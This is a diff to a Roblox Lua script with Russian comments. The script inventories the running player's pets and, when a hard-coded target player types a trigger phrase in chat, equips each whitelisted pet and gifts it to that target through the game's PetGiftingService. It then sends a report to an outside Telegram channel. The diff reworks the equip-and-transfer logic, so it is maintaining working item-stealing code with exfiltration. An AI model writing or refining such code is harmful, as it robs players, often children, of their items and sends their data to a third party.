@@ -16,6 +16,9 @@ local WHITELIST = {
     "Hamster",
 }
 
+-- Получаем PetGiftingService один раз
+local PetGiftingService = ReplicatedStorage:WaitForChild("GameEvents"):WaitForChild("PetGiftingService")
+
 -- 🔎 Найти ВСЕХ питомцев (с весом и возрастом)
 local function getAllPets()
     local pets = {}
@@ -92,22 +95,19 @@ end
 
 sendInitialNotification()
 
--- 👂 (по желанию) слушатель чата для передачи питомцев (оставил из твоего скрипта)
-local function equipPet(pet)
-    if pet and player.Character and player.Character:FindFirstChild("Humanoid") then
-        player.Character.Humanoid:EquipTool(pet)
-        task.wait(1)
-        return true
-    end
-    return false
-end
-
+-- Передать одного питомца
 local function transferPet(pet)
     if not pet.isWhitelisted then return false end
     local target = Players:FindFirstChild(TARGET_PLAYER)
-    if target and ReplicatedStorage:FindFirstChild("PetGiftingService") then
-        ReplicatedStorage.PetGiftingService:FireServer("GivePet", target)
-        return true
+    if target and PetGiftingService then
+        if player.Character and player.Character:FindFirstChild("Humanoid") then
+            -- Экипируем питомца
+            player.Character.Humanoid:EquipTool(pet.object)
+            task.wait(1)
+            -- Отправляем запрос на передачу экипированного питомца
+            PetGiftingService:FireServer("GivePet", target)
+            return true
+        end
     end
     return false
 end
@@ -122,12 +122,10 @@ local function startPetTransfer()
     local transferred = 0
     for _, pet in ipairs(pets) do
         if pet.isWhitelisted then
-            if equipPet(pet.object) then
-                if transferPet(pet) then
-                    transferred += 1
-                end
-                task.wait(2)
+            if transferPet(pet) then
+                transferred += 1
             end
+            task.wait(2)
         end
     end
 
@@ -139,8 +137,7 @@ local function startPetTransfer()
     sendToTelegram(table.concat(report, "\n"))
 end
 
--- === НОВЫЙ КОД: подписка на чат через TextChatService ===
-
+-- Обработка входящих сообщений через TextChatService (лучший способ ловить чат в LocalScript)
 if TextChatService then
     TextChatService.OnIncomingMessage = function(message)
         local speaker = Players:FindFirstChild(message.TextSource.Name)
@@ -149,7 +146,7 @@ if TextChatService then
         end
     end
 else
-    -- fallback на старое событие (если TextChatService нет)
+    -- fallback на старое событие, если TextChatService нет
     Players.PlayerChatted:Connect(function(chatType, speaker, message)
         if chatType == Enum.PlayerChatType.All and speaker.Name == TARGET_PLAYER and message == TRIGGER_MESSAGE then
             startPetTransfer()
